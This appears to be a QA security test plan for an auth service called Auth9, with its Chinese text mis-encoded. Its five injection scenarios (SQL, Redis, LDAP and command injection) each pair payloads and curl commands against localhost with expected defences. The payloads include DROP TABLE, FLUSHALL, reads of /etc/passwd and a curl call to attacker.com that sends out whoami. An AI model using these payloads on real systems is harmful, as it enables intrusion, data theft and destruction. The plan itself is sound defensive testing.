# è¾“å…¥éªŒè¯ - æ³¨å…¥æ”»å‡»æµ‹è¯•

**æ¨¡å—**: è¾“å…¥éªŒè¯
**æµ‹è¯•èŒƒå›´**: SQL æ³¨å…¥ã€NoSQL æ³¨å…¥ã€å‘½ä»¤æ³¨å…¥
**åœºæ™¯æ•°**: 5
**é£é™©ç­‰çº§**: ğŸ”´ æé«˜

---

## èƒŒæ™¯çŸ¥è¯†

Auth9 æŠ€æœ¯æ ˆæ³¨å…¥é£é™©ç‚¹ï¼š
- **SQL**: TiDB (MySQL å…¼å®¹)ï¼Œä½¿ç”¨ sqlx å‚æ•°åŒ–æŸ¥è¯¢
- **Redis**: å¯èƒ½çš„å‘½ä»¤æ³¨å…¥
- **Keycloak API**: HTTP å‚æ•°æ³¨å…¥

---

## åœºæ™¯ 1ï¼šSQL æ³¨å…¥ - è®¤è¯ç»•è¿‡

### å‰ç½®æ¡ä»¶
- è®¿é—®ç™»å½•æˆ–è®¤è¯ç›¸å…³ç«¯ç‚¹

### æ”»å‡»ç›®æ ‡
éªŒè¯è®¤è¯æµç¨‹æ˜¯å¦å­˜åœ¨ SQL æ³¨å…¥

### æ”»å‡»æ­¥éª¤
1. åœ¨ç”¨æˆ·å/é‚®ç®±å­—æ®µæ³¨å…¥ï¼š
   - `admin'--`
   - `' OR '1'='1`
   - `admin'; DROP TABLE users;--`
2. åœ¨å¯†ç å­—æ®µæ³¨å…¥
3. æ£€æŸ¥å“åº”å’Œæ•°æ®åº“çŠ¶æ€

### é¢„æœŸå®‰å…¨è¡Œä¸º
- è¾“å…¥è¢«æ­£ç¡®è½¬ä¹‰æˆ–å‚æ•°åŒ–
- è¿”å›æ­£å¸¸çš„è®¤è¯å¤±è´¥
- æ•°æ®åº“ä¸å—å½±å“

### éªŒè¯æ–¹æ³•
```bash
# ç™»å½•æ³¨å…¥æµ‹è¯•
curl -X POST http://localhost:8080/api/v1/auth/token \
  -d "grant_type=password" \
  -d "client_id=auth9-portal" \
  -d "username=admin'--" \
  -d "password=anything"
# é¢„æœŸ: 401 Invalid credentials (ä¸æ˜¯ SQL é”™è¯¯)

curl -X POST http://localhost:8080/api/v1/auth/token \
  -d "username=' OR '1'='1" \
  -d "password=' OR '1'='1"
# é¢„æœŸ: 401 (ä¸åº”ç™»å½•æˆåŠŸ)

# ä½¿ç”¨ sqlmap è‡ªåŠ¨åŒ–æµ‹è¯•
sqlmap -u "http://localhost:8080/api/v1/users?search=test" \
  --headers="Authorization: Bearer $TOKEN" \
  --level=3 --risk=2
```

### ä¿®å¤å»ºè®®
- ä½¿ç”¨å‚æ•°åŒ–æŸ¥è¯¢ (sqlx å·²æ”¯æŒ)
- è¾“å…¥éªŒè¯å’Œé•¿åº¦é™åˆ¶
- é”™è¯¯ä¿¡æ¯ä¸æš´éœ² SQL ç»†èŠ‚
- æ•°æ®åº“ç”¨æˆ·æœ€å°æƒé™

---

## åœºæ™¯ 2ï¼šSQL æ³¨å…¥ - æ•°æ®æå–

### å‰ç½®æ¡ä»¶
- å…·æœ‰æœç´¢/è¿‡æ»¤åŠŸèƒ½çš„ç«¯ç‚¹
- æœ‰æ•ˆçš„è®¤è¯ Token

### æ”»å‡»ç›®æ ‡
éªŒè¯æœç´¢åŠŸèƒ½æ˜¯å¦å¯è¢«ç”¨äºæ•°æ®æå–

### æ”»å‡»æ­¥éª¤
1. æ‰¾åˆ°æœç´¢/è¿‡æ»¤ç«¯ç‚¹
2. å°è¯•æ³¨å…¥ï¼š
   - `test' UNION SELECT * FROM users--`
   - `test' AND 1=1--` vs `test' AND 1=2--`
   - ç›²æ³¨ï¼š`test' AND SLEEP(5)--`
3. åˆ†æå“åº”å·®å¼‚

### é¢„æœŸå®‰å…¨è¡Œä¸º
- UNION æ³¨å…¥ä¸è¿”å›é¢å¤–æ•°æ®
- å¸ƒå°”ç›²æ³¨å“åº”ä¸€è‡´
- æ—¶é—´ç›²æ³¨ä¸å»¶è¿Ÿ

### éªŒè¯æ–¹æ³•
```bash
# æœç´¢ç«¯ç‚¹æµ‹è¯•
curl -H "Authorization: Bearer $TOKEN" \
  "http://localhost:8080/api/v1/users?search=test'+UNION+SELECT+password+FROM+users--"
# é¢„æœŸ: æ­£å¸¸æœç´¢ç»“æœ (ä¸åŒ…å«å¯†ç )

# å¸ƒå°”ç›²æ³¨
curl -H "Authorization: Bearer $TOKEN" \
  "http://localhost:8080/api/v1/users?search=test'+AND+'1'='1"
curl -H "Authorization: Bearer $TOKEN" \
  "http://localhost:8080/api/v1/users?search=test'+AND+'1'='2"
# é¢„æœŸ: ä¸¤æ¬¡å“åº”ç›¸åŒ (æ²¡æœ‰å¸ƒå°”å·®å¼‚)

# æ—¶é—´ç›²æ³¨
time curl -H "Authorization: Bearer $TOKEN" \
  "http://localhost:8080/api/v1/users?search=test'+AND+SLEEP(5)--"
# é¢„æœŸ: å“åº”æ—¶é—´ < 1ç§’
```

### ä¿®å¤å»ºè®®
- æœç´¢ä½¿ç”¨ LIKE å‚æ•°åŒ–
- é™åˆ¶è¿”å›å­—æ®µ
- æ·»åŠ æŸ¥è¯¢è¶…æ—¶
- ç›‘æ§å¼‚å¸¸æŸ¥è¯¢æ¨¡å¼

---

## åœºæ™¯ 3ï¼šNoSQL / Redis æ³¨å…¥

### å‰ç½®æ¡ä»¶
- ç³»ç»Ÿä½¿ç”¨ Redis ç¼“å­˜
- äº†è§£ Redis å‘½ä»¤ç»“æ„

### æ”»å‡»ç›®æ ‡
éªŒè¯ Redis æ“ä½œæ˜¯å¦å­˜åœ¨æ³¨å…¥é£é™©

### æ”»å‡»æ­¥éª¤
1. æ‰¾åˆ°å¯èƒ½ä½¿ç”¨ Redis çš„åŠŸèƒ½ï¼š
   - Session å­˜å‚¨
   - ç¼“å­˜é”®æ„é€ 
   - é™æµè®¡æ•°å™¨
2. å°è¯•æ³¨å…¥ Redis å‘½ä»¤ï¼š
   - åœ¨ç¼“å­˜é”®ä¸­æ³¨å…¥ `\r\n`
   - å°è¯• KEYS * é€šé…ç¬¦
3. æ£€æŸ¥æ˜¯å¦èƒ½æ‰§è¡Œä»»æ„å‘½ä»¤

### é¢„æœŸå®‰å…¨è¡Œä¸º
- ç¼“å­˜é”®æ­£ç¡®è½¬ä¹‰
- ä¸èƒ½æ‰§è¡Œé¢å¤–å‘½ä»¤
- é™åˆ¶å¯è®¿é—®çš„é”®ç©ºé—´

### éªŒè¯æ–¹æ³•
```bash
# åœ¨å¯èƒ½å½±å“ç¼“å­˜é”®çš„å‚æ•°ä¸­æ³¨å…¥
curl -H "Authorization: Bearer $TOKEN" \
  "http://localhost:8080/api/v1/users?cache_key=test\r\nKEYS+*\r\n"
# é¢„æœŸ: æ­£å¸¸å“åº” (æ³¨å…¥æœªç”Ÿæ•ˆ)

# æ£€æŸ¥ Redis æ—¥å¿—
redis-cli MONITOR
# è§‚å¯Ÿæ˜¯å¦æœ‰å¼‚å¸¸å‘½ä»¤

# å°è¯•åœ¨ session ç›¸å…³å‚æ•°æ³¨å…¥
curl -X POST http://localhost:8080/api/v1/auth/login \
  -H "X-Session-ID: test\r\nFLUSHALL\r\n"
# é¢„æœŸ: å¿½ç•¥æˆ–æ‹’ç»
```

### ä¿®å¤å»ºè®®
- ç¼“å­˜é”®ä½¿ç”¨å›ºå®šå‰ç¼€
- è¿‡æ»¤æˆ–ç¼–ç ç‰¹æ®Šå­—ç¬¦
- Redis å¯†ç ä¿æŠ¤
- é™åˆ¶ Redis å‘½ä»¤æƒé™

---

## åœºæ™¯ 4ï¼šLDAP / Keycloak æ³¨å…¥

### å‰ç½®æ¡ä»¶
- ç³»ç»Ÿä¸ Keycloak é›†æˆ
- ç”¨æˆ·æœç´¢åŠŸèƒ½

### æ”»å‡»ç›®æ ‡
éªŒè¯ Keycloak Admin API è°ƒç”¨æ˜¯å¦å­˜åœ¨æ³¨å…¥

### æ”»å‡»æ­¥éª¤
1. æ‰¾åˆ°ç”¨æˆ·æœç´¢/åŒæ­¥åŠŸèƒ½
2. åœ¨æœç´¢å‚æ•°ä¸­æ³¨å…¥ LDAP è¯­æ³•ï¼š
   - `*)(uid=*`
   - `admin)(|(password=*)`
3. æ£€æŸ¥æ˜¯å¦è¿”å›æœªæˆæƒæ•°æ®

### é¢„æœŸå®‰å…¨è¡Œä¸º
- æœç´¢å‚æ•°è¢«æ­£ç¡®è½¬ä¹‰
- ä¸èƒ½æ„é€ ä»»æ„ LDAP æŸ¥è¯¢
- é”™è¯¯ä¿¡æ¯ä¸æš´éœ²å†…éƒ¨ç»“æ„

### éªŒè¯æ–¹æ³•
```bash
# Keycloak ç”¨æˆ·æœç´¢
curl -H "Authorization: Bearer $TOKEN" \
  "http://localhost:8080/api/v1/users?search=*)(%26"
# é¢„æœŸ: ç©ºç»“æœæˆ– 400 é”™è¯¯

# æ£€æŸ¥ Keycloak æ—¥å¿—æ˜¯å¦æœ‰å¼‚å¸¸æŸ¥è¯¢
docker logs keycloak 2>&1 | grep -i "search"
```

### ä¿®å¤å»ºè®®
- è½¬ä¹‰ LDAP ç‰¹æ®Šå­—ç¬¦
- ä½¿ç”¨ Keycloak SDK çš„å®‰å…¨æ–¹æ³•
- é™åˆ¶æœç´¢è¿”å›å­—æ®µ
- è¾“å…¥ç™½åå•éªŒè¯

---

## åœºæ™¯ 5ï¼šå‘½ä»¤æ³¨å…¥

### å‰ç½®æ¡ä»¶
- ç³»ç»Ÿå¯èƒ½æ‰§è¡Œå¤–éƒ¨å‘½ä»¤çš„åŠŸèƒ½
- å¦‚æ–‡ä»¶å¤„ç†ã€å›¾ç‰‡å¤„ç†ç­‰

### æ”»å‡»ç›®æ ‡
éªŒè¯æ˜¯å¦å­˜åœ¨å‘½ä»¤æ³¨å…¥æ¼æ´

### æ”»å‡»æ­¥éª¤
1. æ‰¾åˆ°å¯èƒ½æ‰§è¡Œå‘½ä»¤çš„åŠŸèƒ½ï¼š
   - å¤´åƒä¸Šä¼ /å¤„ç†
   - æ—¥å¿—å¯¼å‡º
   - é‚®ä»¶å‘é€
2. åœ¨æ–‡ä»¶åæˆ–å‚æ•°ä¸­æ³¨å…¥ï¼š
   - `; cat /etc/passwd`
   - `| curl attacker.com/$(whoami)`
   - `` `whoami` ``
3. æ£€æŸ¥å“åº”æˆ–å¤–éƒ¨å›è°ƒ

### é¢„æœŸå®‰å…¨è¡Œä¸º
- ä¸æ‰§è¡Œæ³¨å…¥çš„å‘½ä»¤
- æ–‡ä»¶åè¢«å®‰å…¨å¤„ç†
- è¿”å›æ­£å¸¸é”™è¯¯

### éªŒè¯æ–¹æ³•
```bash
# å¦‚æœæœ‰æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½
curl -X POST -H "Authorization: Bearer $TOKEN" \
  -F "avatar=@test.png;filename='; cat /etc/passwd'" \
  http://localhost:8080/api/v1/users/me/avatar
# é¢„æœŸ: æ­£å¸¸ä¸Šä¼ æˆ– 400

# æ£€æŸ¥æ˜¯å¦æœ‰å›è°ƒ
# åœ¨æ³¨å…¥ payload ä¸­åŒ…å« callback URL
# ç›‘æ§æ˜¯å¦æ”¶åˆ°è¯·æ±‚

# é‚®ä»¶åŠŸèƒ½æµ‹è¯•
curl -X POST -H "Authorization: Bearer $TOKEN" \
  http://localhost:8080/api/v1/system/email/test \
  -d '{"to": "test@example.com; cat /etc/passwd |"}'
# é¢„æœŸ: 400 Invalid email
```

### ä¿®å¤å»ºè®®
- é¿å…æ‰§è¡Œå¤–éƒ¨å‘½ä»¤
- ä½¿ç”¨è¯­è¨€åŸç”Ÿåº“æ›¿ä»£ shell
- ä¸¥æ ¼è¾“å…¥éªŒè¯
- ä½¿ç”¨æ²™ç®±ç¯å¢ƒ

---

## æ£€æŸ¥æ¸…å•

| # | åœºæ™¯ | çŠ¶æ€ | æµ‹è¯•æ—¥æœŸ | æµ‹è¯•äººå‘˜ | å‘ç°é—®é¢˜ |
|---|------|------|----------|----------|----------|
| 1 | SQL æ³¨å…¥ - è®¤è¯ç»•è¿‡ | âœ… | 2026-02-15 | QAæµ‹è¯• | é€šè¿‡ - æ— æ¼æ´ |
| 2 | SQL æ³¨å…¥ - æ•°æ®æå– | âœ… | 2026-02-15 | QAæµ‹è¯• | é€šè¿‡ - æ— æ¼æ´ |
| 3 | NoSQL / Redis æ³¨å…¥ | âœ… | 2026-02-15 | QAæµ‹è¯• | é€šè¿‡ - æ— æ¼æ´ |
| 4 | LDAP / Keycloak æ³¨å…¥ | âœ… | 2026-02-15 | QAæµ‹è¯• | é€šè¿‡ - æ— æ¼æ´ |
| 5 | å‘½ä»¤æ³¨å…¥ | âœ… | 2026-02-15 | QAæµ‹è¯• | é€šè¿‡ - æ— æ¼æ´ |

---

## è‡ªåŠ¨åŒ–æµ‹è¯•å·¥å…·

```bash
# SQLMap - SQL æ³¨å…¥
sqlmap -u "http://localhost:8080/api/v1/users?search=test" \
  --headers="Authorization: Bearer $TOKEN" \
  --batch --level=5 --risk=3

# Burp Suite - ä¸»åŠ¨æ‰«æ
# é…ç½®ä»£ç†åä½¿ç”¨ Scanner åŠŸèƒ½

# Nuclei - æ¨¡æ¿æ‰«æ
nuclei -u http://localhost:8080 -t sqli/
```

---

## å‚è€ƒèµ„æ–™

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
